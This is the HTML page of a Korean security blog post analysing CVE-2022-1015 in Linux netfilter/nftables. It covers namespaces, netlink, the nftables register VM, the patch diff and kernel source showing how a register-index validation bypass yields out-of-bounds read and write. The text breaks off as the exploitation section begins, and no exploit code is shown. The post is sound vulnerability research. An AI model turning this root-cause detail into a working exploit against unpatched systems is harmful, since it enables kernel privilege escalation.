<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2022-1015 Linux kernel netfilter | msh1307</title>
<meta name="keywords" content="Linux kernel, CVE-2022-1015, netfilter">
<meta name="description" content="Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.
Namespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.
nested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/cve-2022-1015-linux-kernel-netfilter/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2022-1015 Linux kernel netfilter" />
<meta property="og:description" content="Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.
Namespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.
nested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/cve-2022-1015-linux-kernel-netfilter/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-03-10T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-03-10T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2022-1015 Linux kernel netfilter"/>
<meta name="twitter:description" content="Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.
Namespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.
nested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "CVE-2022-1015 Linux kernel netfilter",
      "item": "https://msh1307.kr/blog/cve-2022-1015-linux-kernel-netfilter/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2022-1015 Linux kernel netfilter",
  "name": "CVE-2022-1015 Linux kernel netfilter",
  "description": "Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.\nNamespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.\nnested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다.",
  "keywords": [
    "Linux kernel", "CVE-2022-1015", "netfilter"
  ],
  "articleBody": "Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.\nNamespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.\nnested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다. 커널은 32개의 nested level로 제한을 둔다. 모든 프로세스는 정확히 하나의 유저 네임스페이스의 멤버이다. fork나 clone에 CLONE_NEWUSER 플래그 없이 만들어졌으면 부모 프로세스와 똑같은 네임스페이스를 가진다. 도커 컨테이너 구현할때도 써진다.\n하이퍼바이저랑 약간의 차이가 있는데, 하이퍼바이저는 하드웨어를 가상화한다. 그런데 네임스페이스는 하드웨어를 분리하지 않고 동일한 OS나 커널에서 돌아간다.\nNamespace가 중요한 이유는, attack vector가 넓어지기 때문에.\nNetfilter 서브시스템 넷필터는 네트워크 패킷처리나 라우팅 등 여러가지 기능을 처리해주는 커널의 서브시스템중 하나이다. 넷필터 프로젝트라고 커널의 그쪽 부분을 담당하는 프로젝트이다. 필터링 라우팅 NAT 패킷 수정 등을 처리한다.\nNetlink socket 넷링크 소켓은 커널과 사용자 공간사이 통신할 수 있는 IPC 메커니즘 중 하나이다. 하나 이상의 Netlink message를 붙여서 request response 단위로 묶어서 전송을 구현한다. Header와 payload는 align 맞추기 위해서 padding도 있을 수 있다.\n+----------------------+----------------------+----------------------+----------------------+ ~ ~ ~ ~ ~ +----------------------+ | Netlink messaeg #1 | Netlink messaeg #2 | Netlink messaeg #3 | Netlink messaeg #4 | ... | Netlink messaeg #n | | (Header+Payload+Pad) | (Header+Payload+Pad) | (Header+Payload+Pad) | (Header+Payload+Pad) | | (Header+Payload+Pad) | +----------------------+----------------------+----------------------+----------------------+ ~ ~ ~ ~ ~ +----------------------+ \u003c--------------------------------------------------- Request OR Response packet -----------------------------------------------\u003e message format은 이렇게 생겼다.\n\u003c------- NLA_HDRLEN ------\u003e \u003c-- NLA_ALIGN(payload)--\u003e +---------------------+- - -+- - - - - - - - - -+- - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ | Header | Pad | Payload | Pad | ... (Next attribute) ... | (struct nlattr) | ing | | ing | +---------------------+- - -+- - - - - - - - - -+- - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ↑ nlattr \u003c-------------- nlattr-\u003enla_len --------------\u003e nla_type (16 bits) +---+---+-------------------------------+ | N | O | Attribute Type | +---+---+-------------------------------+ N := Carries nested attributes O := Payload stored in network byte order Note: The N and O flag are mutually exclusive. \u003c----- NLMSG_HDRLEN ------\u003e \u003c-------- Payload-Len --------\u003e +---------------------+- - -+- - - - - - - - - - - - - - - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ | Header | Pad | Payload | ... (Next netlink message) ... | (struct nlmsghdr) | ing | Specific data + [attribute..] | +---------------------+- - -+- - - - - - - - - - - - - - - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ↑ nlmsghdr ↑ NLMSG_DATA(\u0026nlmsghdr) ↑ NLMSG_NEXT(\u0026nlmsghdr) \u003c------------------ nlmsghdr-\u003enlmsg_len ------------------\u003e \u003c------------------ NLMSG_LENGTH(Payload-Len) ------------\u003e 넷링크 헤더, 속성 구조체의 모습이다.\nstruct nlmsghdr { uint32_t nlmsg_len; /* Header를 포함한 Netlink message 크기 */ uint16_t nlmsg_type; /* Message content */ uint16_t nlmsg_flags; /* Additional flags */ uint32_t nlmsg_seq; /* Sequence number */ uint32_t nlmsg_pid; /* Sending process port ID */ }; struct nlattr { uint16_t nla_len; /* Header를 포함한 attribute 크기 */ uint16_t nla_type; /* Attribute type */ }; 어떤식으로로 구현하는지에 대한 예제도 examples에서 찾을 수 있었다.\ns_socket = socket(PF_NETLINK, SOCK_RAW, NETLINK_XFRM); __u32 s_nl_groups; struct sockaddr_nl s_sockaddr_nl; s_nl_groups |= XFRMNLGRP_ACQUIRE; s_nl_groups |= XFRMNLGRP_EXPIRE; s_nl_groups |= XFRMNLGRP_SA; s_nl_groups |= XFRMNLGRP_POLICY; s_nl_groups |= XFRMNLGRP_AEVENTS; s_nl_groups |= XFRMNLGRP_REPORT; s_nl_groups |= XFRMNLGRP_MIGRATE; s_nl_groups |= XFRMNLGRP_MAPPING; s_sockaddr_nl.nl_family = AF_NETLINK; s_sockaddr_nl.nl_pad = (unsigned short)0u; s_sockaddr_nl.nl_pid = (pid_t)0; s_sockaddr_nl.nl_groups = s_nl_groups; /* Multicast groups mask */ bind(s_socket, (const struct sockaddr *)(\u0026s_sockaddr_nl), (socklen_t)sizeof(s_sockaddr_nl)); sock_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE); __u32 s_nl_groups; struct sockaddr_nl s_sockaddr_nl; s_nl_groups |= XFRMNLGRP_ACQUIRE; s_nl_groups |= XFRMNLGRP_EXPIRE; s_nl_groups |= XFRMNLGRP_SA; s_nl_groups |= XFRMNLGRP_POLICY; s_nl_groups |= XFRMNLGRP_AEVENTS; s_nl_groups |= XFRMNLGRP_REPORT; s_nl_groups |= XFRMNLGRP_MIGRATE; s_nl_groups |= XFRMNLGRP_MAPPING; s_sockaddr_nl.nl_family = AF_NETLINK; s_sockaddr_nl.nl_pad = (unsigned short)0u; s_sockaddr_nl.nl_pid = (pid_t)0; s_sockaddr_nl.nl_groups = s_nl_groups; /* Multicast groups mask */ bind(s_socket, (const struct sockaddr *)(\u0026s_sockaddr_nl), (socklen_t)sizeof(s_sockaddr_nl)); socklen_t s_socklen; s_socklen = (socklen_t)sizeof(s_sockaddr_nl); s_recv_bytes = recvfrom( s_socket, s_buffer, s_buffer_size, MSG_NOSIGNAL, (struct sockaddr *)(\u0026s_sockaddr_nl), (socklen_t *)(\u0026s_socklen) ); size_t s_msg_size; struct nlmsghdr *s_nlmsghdr; size_t s_payload_size; void *s_payload; s_msg_size = (size_t)s_recv_bytes; for(s_nlmsghdr = (struct nlmsghdr *)s_buffer;(s_is_break == 0) \u0026\u0026 NLMSG_OK(s_nlmsghdr, s_msg_size);s_nlmsghdr = NLMSG_NEXT(s_nlmsghdr, s_msg_size)) { /* Netlink 수신패킷 하나에 여러개의 Netlink header가 탑재될 수 있는데 이를 각 Header 단위로 분리하는 Loop */ s_payload_size = (size_t)NLMSG_PAYLOAD(s_nlmsghdr, 0); /* Header 내의 실제 Data 크기 */ s_payload = NLMSG_DATA(s_nlmsghdr); /* Header 내의 실제 Data 위치 포인터 */ switch(s_nlmsghdr-\u003enlmsg_type) { /* 각 메세지의 종류별로 다른 파싱구조를 가지고 있으므로 커널을 참조하여 해당 부분을 파싱해야 합니다. */ ..... } } 도메인은 AF_NETLINK를 쓰고 SOCK_RAW를 사용한다. netlink protocol은 netlink group과 kernel modules간의 통신을 위해 Netlink family를 선택한다. NETLINK_ROUTE : routing 업데이트 및 ipv4 routing 등등\nnftables ip tables, ip6 tables, arp tables, eb tables을 대체할 수 있다. 원래는 ip tables가 패킷 필터링 기능을 수행했지만 ip tables를 대체할 프레임워크로 nftables가 나왔다. 넷필터 서브시스템에서 nftables가 iptables 역할을 대신해서 vm 기반 룰을 작성할 수 있다. iptables VS nftables 차이는 위와 같다. nftables는 커널 내부의 경량 가상머신을 이용해서 패킷이 필터링 된다. 훅포인트는 5개이다. Prerouting은 NIC 카드에 패킷 들어왔을때, Input은 packet이 local로 들어왔을때 등 중요한 오브젝트들이 많다. 제일 중요한 테이블이 있다. chain들은 rule의 집합이고 rule은 expression의 집합이다. meta cmp payload bitwise immediate etc.. register가 16바이트짜리가 있음. 레지스터인데 메모리로 처리한다. 선형적인 메모리 레이아웃 meta expression이 있다. vm에서 map이 지원되기 때문에, key에 해당하는 데이터를 로드하고 저장가능. bitwise는 레지스터간 bit 연산을 수행한다. payload가 있는데, 데이터 복사에 사용된다. CVE-2022-1015 net/netfilter/nf_tables_api.c | 22 +++++++++++++++++----- 1 file changed, 17 insertions(+), 5 deletions(-) diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c index d71a33ae39b3..1f5a0eece0d1 100644 --- a/net/netfilter/nf_tables_api.c +++ b/net/netfilter/nf_tables_api.c @@ -9275,17 +9275,23 @@ int nft_parse_u32_check(const struct nlattr *attr, int max, u32 *dest) } EXPORT_SYMBOL_GPL(nft_parse_u32_check); -static unsigned int nft_parse_register(const struct nlattr *attr) +static unsigned int nft_parse_register(const struct nlattr *attr, u32 *preg) { unsigned int reg; reg = ntohl(nla_get_be32(attr)); switch (reg) { case NFT_REG_VERDICT...NFT_REG_4: -\treturn reg * NFT_REG_SIZE / NFT_REG32_SIZE; +\t*preg = reg * NFT_REG_SIZE / NFT_REG32_SIZE; +\tbreak; +\tcase NFT_REG32_00...NFT_REG32_15: +\t*preg = reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; +\tbreak; default: -\treturn reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; +\treturn -ERANGE; } + +\treturn 0; } /** @@ -9327,7 +9333,10 @@ int nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len) u32 reg; int err; -\treg = nft_parse_register(attr); +\terr = nft_parse_register(attr, \u0026reg); +\tif (err \u003c 0) +\treturn err; + err = nft_validate_register_load(reg, len); if (err \u003c 0) return err; @@ -9382,7 +9391,10 @@ int nft_parse_register_store(const struct nft_ctx *ctx, int err; u32 reg; -\treg = nft_parse_register(attr); +\terr = nft_parse_register(attr, \u0026reg); +\tif (err \u003c 0) +\treturn err; + err = nft_validate_register_store(ctx, reg, data, type, len); if (err \u003c 0) return err; -- NFT_REG_VERDICT … NFT_REG_4가 아니면, REG32라고 단정지어버린다.\nint nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len) { u32 reg; int err; reg = nft_parse_register(attr); err = nft_validate_register_load(reg, len); if (err \u003c 0) return err; *sreg = reg; return 0; } EXPORT_SYMBOL_GPL(nft_parse_register_load); ... EXPORT_SYMBOL_GPL(nft_parse_u32_check); static unsigned int nft_parse_register(const struct nlattr *attr) { unsigned int reg; reg = ntohl(nla_get_be32(attr)); switch (reg) { case NFT_REG_VERDICT...NFT_REG_4: return reg * NFT_REG_SIZE / NFT_REG32_SIZE; default: return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; } } ... EXPORT_SYMBOL_GPL(nft_dump_register); static int nft_validate_register_load(enum nft_registers reg, unsigned int len) { if (reg \u003c NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE) return -EINVAL; if (len == 0) return -EINVAL; if (reg * NFT_REG32_SIZE + len \u003e sizeof_field(struct nft_regs, data)) return -ERANGE; return 0; } validation check도 우회할 수 있다. reg \u003c 4 → EINVAL.\n4랑 곱하면 어차피 integer overflow로 인해 bypass 가능하다. 결국 OoB 마찬가지로 register store할때도 똑같이 발생한다.\nnft_payload if (tb[NFTA_PAYLOAD_SREG] != NULL) { if (tb[NFTA_PAYLOAD_DREG] != NULL) return ERR_PTR(-EINVAL); return \u0026nft_payload_set_ops; } offset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET])); len = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN])); if (len \u003c= 4 \u0026\u0026 is_power_of_2(len) \u0026\u0026 IS_ALIGNED(offset, len) \u0026\u0026 base != NFT_PAYLOAD_LL_HEADER) return \u0026nft_payload_fast_ops; else return \u0026nft_payload_ops; SREG == NOT NULL / DREG == NULL -\u003e payload_set_ops\nSREG == NULL / DREG == NOT NULL -\u003e payload_ops or fast\n총 두개로 갈려서 세팅 가능.\nstatic const struct nft_expr_ops nft_payload_set_ops = { .type\t= \u0026nft_payload_type, .size\t= NFT_EXPR_SIZE(sizeof(struct nft_payload_set)), .eval\t= nft_payload_set_eval, .init\t= nft_payload_set_init, .dump\t= nft_payload_set_dump, }; static const struct nft_expr_ops nft_payload_ops = { .type\t= \u0026nft_payload_type, .size\t= NFT_EXPR_SIZE(sizeof(struct nft_payload)), .eval\t= nft_payload_eval, .init\t= nft_payload_init, .dump\t= nft_payload_dump, .offload\t= nft_payload_offload, }; const struct nft_expr_ops nft_payload_fast_ops = { .type\t= \u0026nft_payload_type, .size\t= NFT_EXPR_SIZE(sizeof(struct nft_payload)), .eval\t= nft_payload_eval, .init\t= nft_payload_init, .dump\t= nft_payload_dump, .offload\t= nft_payload_offload, }; 실질적으로 다른 역할을 하는건 payload_ops set_ops 차이다. init → eval 순서\nnft_payload_ops static int nft_payload_init(const structnft_ctx *ctx, const structnft_expr *expr, const structnlattr * consttb[]) { structnft_payload *priv =nft_expr_priv(expr); priv-\u003ebase =ntohl(nla_get_be32(tb[NFTA_PAYLOAD_BASE])); priv-\u003eoffset =ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET])); priv-\u003elen =ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN])); return nft_parse_register_store(ctx,tb[NFTA_PAYLOAD_DREG], \u0026priv-\u003edreg, NULL,NFT_DATA_VALUE, priv-\u003elen); } init에서 실질적으로 검증 우회해서 dreg OOB 발생시킬 수 있다.\nvoid nft_payload_eval(const struct nft_expr *expr, struct nft_regs *regs, const struct nft_pktinfo *pkt) { const struct nft_payload *priv = nft_expr_priv(expr); const struct sk_buff *skb = pkt-\u003eskb; u32 *dest = \u0026regs-\u003edata[priv-\u003edreg]; int offset; if (priv-\u003elen % NFT_REG32_SIZE) dest[priv-\u003elen / NFT_REG32_SIZE] = 0; switch (priv-\u003ebase) { case NFT_PAYLOAD_LL_HEADER: if (!skb_mac_header_was_set(skb)) goto err; if (skb_vlan_tag_present(skb)) { if (!nft_payload_copy_vlan(dest, skb, priv-\u003eoffset, priv-\u003elen)) goto err; return; } offset = skb_mac_header(skb) - skb-\u003edata; break; case NFT_PAYLOAD_NETWORK_HEADER: offset = skb_network_offset(skb); break; case NFT_PAYLOAD_TRANSPORT_HEADER: if (!pkt-\u003etprot_set) goto err; offset = nft_thoff(pkt); break; default: BUG(); } offset += priv-\u003eoffset; if (skb_copy_bits(skb, offset, dest, priv-\u003elen) \u003c 0) goto err; return; err: regs-\u003everdict.code = NFT_BREAK; } eval에서 실질적으로 처리한다.\nint skb_copy_bits(const struct sk_buff *skb, int offset, void *to, int len) { int start = skb_headlen(skb); struct sk_buff *frag_iter; int i, copy; if (offset \u003e (int)skb-\u003elen - len) goto fault; /* Copy header. */ if ((copy = start - offset) \u003e 0) { if (copy \u003e len) copy = len; skb_copy_from_linear_data_offset(skb, offset, to, copy); if ((len -= copy) == 0) return 0; offset += copy; to += copy; } for (i = 0; i \u003c skb_shinfo(skb)-\u003enr_frags; i++) { int end; skb_frag_t *f = \u0026skb_shinfo(skb)-\u003efrags[i]; WARN_ON(start \u003e offset + len); end = start + skb_frag_size(f); if ((copy = end - offset) \u003e 0) { u32 p_off, p_len, copied; struct page *p; u8 *vaddr; if (copy \u003e len) copy = len; skb_frag_foreach_page(f, skb_frag_off(f) + offset - start, copy, p, p_off, p_len, copied) { vaddr = kmap_atomic(p); memcpy(to + copied, vaddr + p_off, p_len); kunmap_atomic(vaddr); } if ((len -= copy) == 0) return 0; offset += copy; to += copy; } start = end; } skb_walk_frags(skb, frag_iter) { int end; WARN_ON(start \u003e offset + len); end = start + frag_iter-\u003elen; if ((copy = end - offset) \u003e 0) { if (copy \u003e len) copy = len; if (skb_copy_bits(frag_iter, offset - start, to, copy)) goto fault; if ((len -= copy) == 0) return 0; offset += copy; to += copy; } start = end; } if (!len) return 0; fault: return -EFAULT; } EXPORT_SYMBOL(skb_copy_bits); static inline void skb_copy_from_linear_data_offset(const struct sk_buff *skb, const int offset, void *to, const unsigned int len) { memcpy(to, skb-\u003edata + offset, len); } OOB write\nnft_payload_set_ops static int nft_payload_set_init(const struct nft_ctx *ctx, const struct nft_expr *expr, const struct nlattr * const tb[]) { struct nft_payload_set *priv = nft_expr_priv(expr); priv-\u003ebase = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_BASE])); priv-\u003eoffset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET])); priv-\u003elen = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN])); if (tb[NFTA_PAYLOAD_CSUM_TYPE]) priv-\u003ecsum_type = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_CSUM_TYPE])); if (tb[NFTA_PAYLOAD_CSUM_OFFSET]) priv-\u003ecsum_offset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_CSUM_OFFSET])); if (tb[NFTA_PAYLOAD_CSUM_FLAGS]) { u32 flags; flags = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_CSUM_FLAGS])); if (flags \u0026 ~NFT_PAYLOAD_L4CSUM_PSEUDOHDR) return -EINVAL; priv-\u003ecsum_flags = flags; } switch (priv-\u003ecsum_type) { case NFT_PAYLOAD_CSUM_NONE: case NFT_PAYLOAD_CSUM_INET: break; case NFT_PAYLOAD_CSUM_SCTP: if (priv-\u003ebase != NFT_PAYLOAD_TRANSPORT_HEADER) return -EINVAL; if (priv-\u003ecsum_offset != offsetof(struct sctphdr, checksum)) return -EINVAL; break; default: return -EOPNOTSUPP; } return nft_parse_register_load(tb[NFTA_PAYLOAD_SREG], \u0026priv-\u003esreg, priv-\u003elen); } 여기서 아까 그거 호출된다.\nstatic void nft_payload_set_eval(const struct nft_expr *expr, struct nft_regs *regs, const struct nft_pktinfo *pkt) { const struct nft_payload_set *priv = nft_expr_priv(expr); struct sk_buff *skb = pkt-\u003eskb; const u32 *src = \u0026regs-\u003edata[priv-\u003esreg]; int offset, csum_offset; __wsum fsum, tsum; switch (priv-\u003ebase) { case NFT_PAYLOAD_LL_HEADER: if (!skb_mac_header_was_set(skb)) goto err; offset = skb_mac_header(skb) - skb-\u003edata; break; case NFT_PAYLOAD_NETWORK_HEADER: offset = skb_network_offset(skb); break; case NFT_PAYLOAD_TRANSPORT_HEADER: if (!pkt-\u003etprot_set) goto err; offset = nft_thoff(pkt); break; default: BUG(); } csum_offset = offset + priv-\u003ecsum_offset; offset += priv-\u003eoffset; if ((priv-\u003ecsum_type == NFT_PAYLOAD_CSUM_INET || priv-\u003ecsum_flags) \u0026\u0026 (priv-\u003ebase != NFT_PAYLOAD_TRANSPORT_HEADER || skb-\u003eip_summed != CHECKSUM_PARTIAL)) { fsum = skb_checksum(skb, offset, priv-\u003elen, 0); tsum = csum_partial(src, priv-\u003elen, 0); if (priv-\u003ecsum_type == NFT_PAYLOAD_CSUM_INET \u0026\u0026 nft_payload_csum_inet(skb, src, fsum, tsum, csum_offset)) goto err; if (priv-\u003ecsum_flags \u0026\u0026 nft_payload_l4csum_update(pkt, skb, fsum, tsum) \u003c 0) goto err; } if (skb_ensure_writable(skb, max(offset + priv-\u003elen, 0)) || skb_store_bits(skb, offset, src, priv-\u003elen) \u003c 0) goto err; if (priv-\u003ecsum_type == NFT_PAYLOAD_CSUM_SCTP \u0026\u0026 pkt-\u003etprot == IPPROTO_SCTP \u0026\u0026 skb-\u003eip_summed != CHECKSUM_PARTIAL) { if (nft_payload_csum_sctp(skb, nft_thoff(pkt))) goto err; } return; err: regs-\u003everdict.code = NFT_BREAK; } int skb_store_bits(struct sk_buff *skb, int offset, const void *from, int len) { int start = skb_headlen(skb); struct sk_buff *frag_iter; int i, copy; if (offset \u003e (int)skb-\u003elen - len) goto fault; if ((copy = start - offset) \u003e 0) { if (copy \u003e len) copy = len; skb_copy_to_linear_data_offset(skb, offset, from, copy); if ((len -= copy) == 0) return 0; offset += copy; from += copy; } for (i = 0; i \u003c skb_shinfo(skb)-\u003enr_frags; i++) { skb_frag_t *frag = \u0026skb_shinfo(skb)-\u003efrags[i]; int end; WARN_ON(start \u003e offset + len); end = start + skb_frag_size(frag); if ((copy = end - offset) \u003e 0) { u32 p_off, p_len, copied; struct page *p; u8 *vaddr; if (copy \u003e len) copy = len; skb_frag_foreach_page(frag, skb_frag_off(frag) + offset - start, copy, p, p_off, p_len, copied) { vaddr = kmap_atomic(p); memcpy(vaddr + p_off, from + copied, p_len); kunmap_atomic(vaddr); } if ((len -= copy) == 0) return 0; offset += copy; from += copy; } start = end; } skb_walk_frags(skb, frag_iter) { int end; WARN_ON(start \u003e offset + len); end = start + frag_iter-\u003elen; if ((copy = end - offset) \u003e 0) { if (copy \u003e len) copy = len; if (skb_store_bits(frag_iter, offset - start, from, copy)) goto fault; if ((len -= copy) == 0) return 0; offset += copy; from += copy; } start = end; } if (!len) return 0; fault: return -EFAULT; } EXPORT_SYMBOL(skb_store_bits); ... static inline void skb_copy_to_linear_data_offset(struct sk_buff *skb, const int offset, const void *from, const unsigned int len) { memcpy(skb-\u003edata + offset, from, len); } OOB read\ncase NFT_META_L4PROTO: if (!pkt-\u003etprot_set) goto err; nft_reg_store8(dest, pkt-\u003etprot); break; ... if (pkt-\u003etprot != IPPROTO_TCP \u0026\u0026 pkt-\u003etprot != IPPROTO_UDP) { regs-\u003everdict.code = NFT_BREAK; return; } ... #define IPPROTO_UDP\tIPPROTO_UDP ... enum { IPPROTO_IP = 0,\t/* Dummy protocol for TCP\t*/ #define IPPROTO_IP\tIPPROTO_IP IPPROTO_ICMP = 1,\t/* Internet Control Message Protocol\t*/ #define IPPROTO_ICMP\tIPPROTO_ICMP IPPROTO_IGMP = 2,\t/* Internet Group Management Protocol\t*/ #define IPPROTO_IGMP\tIPPROTO_IGMP IPPROTO_IPIP = 4,\t/* IPIP tunnels (older KA9Q tunnels use 94) */ #define IPPROTO_IPIP\tIPPROTO_IPIP IPPROTO_TCP = 6,\t/* Transmission Control Protocol\t*/ #define IPPROTO_TCP\tIPPROTO_TCP IPPROTO_EGP = 8,\t/* Exterior Gateway Protocol\t*/ #define IPPROTO_EGP\tIPPROTO_EGP IPPROTO_PUP = 12,\t/* PUP protocol\t*/ #define IPPROTO_PUP\tIPPROTO_PUP IPPROTO_UDP = 17,\t/* User Datagram Protocol\t*/ 매크로 열심히 뒤져봤더니 L4proto 부분 어떻게 필터링하는지 알 수 있었다. 17번 사용한다.\nenum nft_payload_bases { NFT_PAYLOAD_LL_HEADER, NFT_PAYLOAD_NETWORK_HEADER, NFT_PAYLOAD_TRANSPORT_HEADER, }; 이때 base 세팅해서 확인도 가능.\nExploitation static unsigned int nft_parse_register(const struct nlattr *attr) { unsigned int reg; reg = ntohl(nla_get_be32(attr)); switch (reg) { case NFT_REG_VERDICT...NFT_REG_4: return reg * NFT_REG_SIZE / NFT_REG32_SIZE; default: return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; } } -4 한 상태로 들어간다.\nstatic int nft_validate_register_load(enum nft_registers reg, unsigned int len) { if (reg \u003c NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE) return -EINVAL; if (len == 0) return 